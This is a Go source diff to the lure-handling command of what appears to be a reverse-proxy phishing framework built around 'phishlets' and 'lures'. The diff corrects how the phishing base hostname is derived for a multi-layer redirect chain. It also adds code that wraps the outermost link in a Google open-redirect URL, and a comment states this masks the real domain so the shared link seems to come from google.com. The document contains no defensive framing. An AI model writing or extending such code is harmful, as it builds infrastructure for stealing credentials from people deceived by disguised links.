@@ -1118,8 +1118,8 @@ func (t *Terminal) handleLures(args []string) error {
 				if err != nil {
 					return fmt.Errorf("chain: %v", err)
 				}
-				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
-				if !ok || len(bhost) == 0 {
+				_, ok := t.cfg.GetSiteDomain(pl.Name)
+				if !ok {
 					return fmt.Errorf("chain: no hostname set for phishlet '%s'", pl.Name)
 				}
 
@@ -1132,21 +1132,7 @@ func (t *Terminal) handleLures(args []string) error {
 					depth = d
 				}
 
-				var base_url string
-				if l.Hostname != "" {
-					base_url = "https://" + l.Hostname
-				} else {
-					purl, err := pl.GetLureUrl(l.Path)
-					if err != nil {
-						return fmt.Errorf("chain: %v", err)
-					}
-					// strip the lure path to get just the base
-					base_url = "https://" + bhost
-					_ = purl
-				}
-				_ = base_url
-
-				// build final lure URL
+				// Build the real lure URL first — this has the correct full hostname.
 				var finalURL string
 				if l.Hostname != "" {
 					finalURL = "https://" + l.Hostname + l.Path
@@ -1158,29 +1144,35 @@ func (t *Terminal) handleLures(args []string) error {
 					finalURL = purl
 				}
 
-				phishBase := "https://" + bhost
-				if l.Hostname != "" {
-					phishBase = "https://" + l.Hostname
+				// Derive phishBase from finalURL so we always use the correct subdomain.
+				parsedFinal, err := url.Parse(finalURL)
+				if err != nil {
+					return fmt.Errorf("chain: failed to parse lure url: %v", err)
 				}
+				phishBase := parsedFinal.Scheme + "://" + parsedFinal.Host
 
 				outerURL, hops, err := GenerateRedirectChain(phishBase, finalURL, depth, t.cfg.GetRedirectChainSecret())
 				if err != nil {
 					return fmt.Errorf("chain: %v", err)
 				}
 
+				// Wrap the outermost hop with a Google open-redirect so the shared
+				// link appears to originate from google.com — masks the real domain.
+				googleWrapped := "https://www.google.com/url?q=" + url.QueryEscape(outerURL)
+
 				log.Info("generated %d-layer redirect chain for lure #%d (%s):", depth, l_id, l.Phishlet)
+				log.Info("  [google]  %s", higreen.Sprint(googleWrapped))
 				for i, hop := range hops {
-					if i == 0 {
-						log.Info("  layer %d [share this]: %s", i+1, higreen.Sprint(hop))
-					} else if i == len(hops)-1 {
-						log.Info("  layer %d [→ lure]:     %s", i+1, cyan.Sprint(hop))
+					label := fmt.Sprintf("  layer %-2d  ", i+1)
+					if i == len(hops)-1 {
+						log.Info("%s%s  %s", label, cyan.Sprint(hop), dgray.Sprint("→ lure"))
 					} else {
-						log.Info("  layer %d:              %s", i+1, yellow.Sprint(hop))
+						log.Info("%s%s", label, yellow.Sprint(hop))
 					}
 				}
-				log.Info("  final destination:     %s", dgray.Sprint(finalURL))
+				log.Info("  final     %s", dgray.Sprint(finalURL))
 				log.Info("")
-				log.Info("share the layer 1 link: %s", white.Sprint(outerURL))
+				log.Info("share this link: %s", white.Sprint(googleWrapped))
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments: lures chain <id> [depth]")
